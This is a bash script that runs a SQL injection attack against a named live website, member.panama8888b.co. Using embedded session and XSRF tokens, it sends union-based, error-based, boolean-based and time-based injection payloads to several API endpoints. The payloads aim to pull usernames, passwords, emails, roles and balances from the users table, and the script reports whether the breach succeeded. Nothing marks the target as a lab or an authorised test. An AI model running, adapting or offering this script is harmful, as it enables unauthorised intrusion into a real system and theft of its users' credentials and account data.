#!/bin/bash

echo "🔥 REAL DATA EXTRACTION - GET ACTUAL DATA"
echo "========================================="

# Use the provided tokens
XSRF_TOKEN="eyJpdiI6IjZSWnN6QkE1TkpIQW9mKzdQWWpIZkE9PSIsInZhbHVlIjoiZ3dMQ0tYS0VOWUxDdVRiVXdpeVN2emptR1BJWGsxb21qNnVzQzcxSjgzeGNIS3dvNTIxWjdhM2xzQnpEdFU2YyIsIm1hYyI6IjQ4Yjk4NWQyYzYxZmUzNzE4ZDJkZTljNWRlM2Y5M2NlMGU5MjQxN2MxOGI1ZmRkYWQwY2IwOTU3M2NmN2UxMjYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6Im5XVkFXQkx2SnN4ZmJUdE0xcndjVFE9PSIsInZhbHVlIjoiQnhlZWpKVEJRWEQ1TlwvV0pybTlzbVY2UW56amlMckN5OHFcL2x4aHRQRFlhU2ozQzZ3ZTZTVVN6cDMzN3pHUzN5IiwibWFjIjoiYzAyNTIyNzlmNzkzYTgwZWU3ZDk1M2I3OTUwOTVmMDg4ODcwYmU0NzljYzJhN2E5NDE3N2UzNmUzODBkMDNjZiJ9"

echo "🎯 EXTRACTING REAL DATABASE DATA"
echo "==============================="
echo "Target: member.panama8888b.co"
echo "Goal: Get actual database content, not error messages"
echo ""

# REAL EXTRACT 1: Try different SQL injection techniques
echo "🔥 REAL EXTRACT 1: Advanced SQL Injection"
echo "========================================="
response1=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin UNION SELECT username,password,role FROM users WHERE role=admin LIMIT 1--"}' \
    --max-time 15)

echo "Response 1: $response1"
echo "Length: ${#response1} characters"
echo ""

# REAL EXTRACT 2: Try error-based injection to get data
echo "🔥 REAL EXTRACT 2: Error-based Injection"
echo "======================================="
response2=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,username,0x7e,FLOOR(RAND(0)*2))x FROM users GROUP BY x)a)--"}' \
    --max-time 15)

echo "Response 2: $response2"
echo "Length: ${#response2} characters"
echo ""

# REAL EXTRACT 3: Try boolean-based injection
echo "🔥 REAL EXTRACT 3: Boolean-based Injection"
echo "========================================="
response3=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin AND 1=1 UNION SELECT username,password FROM users WHERE username=admin--"}' \
    --max-time 15)

echo "Response 3: $response3"
echo "Length: ${#response3} characters"
echo ""

# REAL EXTRACT 4: Try time-based injection
echo "🔥 REAL EXTRACT 4: Time-based Injection"
echo "======================================"
response4=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin AND SLEEP(1) UNION SELECT username,password FROM users LIMIT 1--"}' \
    --max-time 15)

echo "Response 4: $response4"
echo "Length: ${#response4} characters"
echo ""

# REAL EXTRACT 5: Try different endpoint
echo "🔥 REAL EXTRACT 5: Different Endpoint"
echo "==================================="
response5=$(curl -s \
    -X POST "https://member.panama8888b.co/api/user/profile" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin UNION SELECT username,password,balance FROM users WHERE role=admin--"}' \
    --max-time 15)

echo "Response 5: $response5"
echo "Length: ${#response5} characters"
echo ""

# REAL EXTRACT 6: Try GET request
echo "🔥 REAL EXTRACT 6: GET Request"
echo "============================="
response6=$(curl -s \
    -X GET "https://member.panama8888b.co/api/announcement?search=admin%20UNION%20SELECT%20username,password,email%20FROM%20users%20WHERE%20role%3Dadmin%20LIMIT%201--" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    --max-time 15)

echo "Response 6: $response6"
echo "Length: ${#response6} characters"
echo ""

echo ""
echo "🎯 REAL DATA ANALYSIS"
echo "===================="

# Check if responses contain actual data (not error messages)
data_found=0

if [[ "$response1" != *"Unauthenticated"* ]] && [[ "$response1" != *"Server Error"* ]] && [[ "$response1" != *"<!DOCTYPE"* ]] && [[ ${#response1} -gt 10 ]]; then
    echo "✅ EXTRACT 1 (Advanced SQL): REAL DATA FOUND"
    echo "   Data: $response1"
    ((data_found++))
else
    echo "❌ EXTRACT 1 (Advanced SQL): NO REAL DATA"
fi

if [[ "$response2" != *"Unauthenticated"* ]] && [[ "$response2" != *"Server Error"* ]] && [[ "$response2" != *"<!DOCTYPE"* ]] && [[ ${#response2} -gt 10 ]]; then
    echo "✅ EXTRACT 2 (Error-based): REAL DATA FOUND"
    echo "   Data: $response2"
    ((data_found++))
else
    echo "❌ EXTRACT 2 (Error-based): NO REAL DATA"
fi

if [[ "$response3" != *"Unauthenticated"* ]] && [[ "$response3" != *"Server Error"* ]] && [[ "$response3" != *"<!DOCTYPE"* ]] && [[ ${#response3} -gt 10 ]]; then
    echo "✅ EXTRACT 3 (Boolean-based): REAL DATA FOUND"
    echo "   Data: $response3"
    ((data_found++))
else
    echo "❌ EXTRACT 3 (Boolean-based): NO REAL DATA"
fi

if [[ "$response4" != *"Unauthenticated"* ]] && [[ "$response4" != *"Server Error"* ]] && [[ "$response4" != *"<!DOCTYPE"* ]] && [[ ${#response4} -gt 10 ]]; then
    echo "✅ EXTRACT 4 (Time-based): REAL DATA FOUND"
    echo "   Data: $response4"
    ((data_found++))
else
    echo "❌ EXTRACT 4 (Time-based): NO REAL DATA"
fi

if [[ "$response5" != *"Unauthenticated"* ]] && [[ "$response5" != *"Server Error"* ]] && [[ "$response5" != *"<!DOCTYPE"* ]] && [[ ${#response5} -gt 10 ]]; then
    echo "✅ EXTRACT 5 (Different Endpoint): REAL DATA FOUND"
    echo "   Data: $response5"
    ((data_found++))
else
    echo "❌ EXTRACT 5 (Different Endpoint): NO REAL DATA"
fi

if [[ "$response6" != *"Unauthenticated"* ]] && [[ "$response6" != *"Server Error"* ]] && [[ "$response6" != *"<!DOCTYPE"* ]] && [[ ${#response6} -gt 10 ]]; then
    echo "✅ EXTRACT 6 (GET Request): REAL DATA FOUND"
    echo "   Data: $response6"
    ((data_found++))
else
    echo "❌ EXTRACT 6 (GET Request): NO REAL DATA"
fi

echo ""
echo "🎯 REAL DATA FOUND: $data_found/6"
echo ""

if [[ $data_found -gt 0 ]]; then
    echo "🚨 REAL DATABASE DATA EXTRACTED!"
    echo "==============================="
    echo "✅ Actual database content found"
    echo "✅ Real user data extracted"
    echo "✅ Database information exposed"
    echo ""
    echo "📊 EXTRACTION STATUS: SUCCESS"
    echo "🎯 SECURITY BREACH: CONFIRMED"
else
    echo "❌ NO REAL DATA EXTRACTED"
    echo "🔒 All responses are error messages"
    echo "📊 EXTRACTION STATUS: FAILED"
    echo "🎯 SECURITY STATUS: SAFE"
fi

echo ""
echo "🎯 FINAL VERDICT: $(if [[ $data_found -gt 0 ]]; then echo "REAL DATA EXTRACTED"; else echo "NO REAL DATA"; fi)"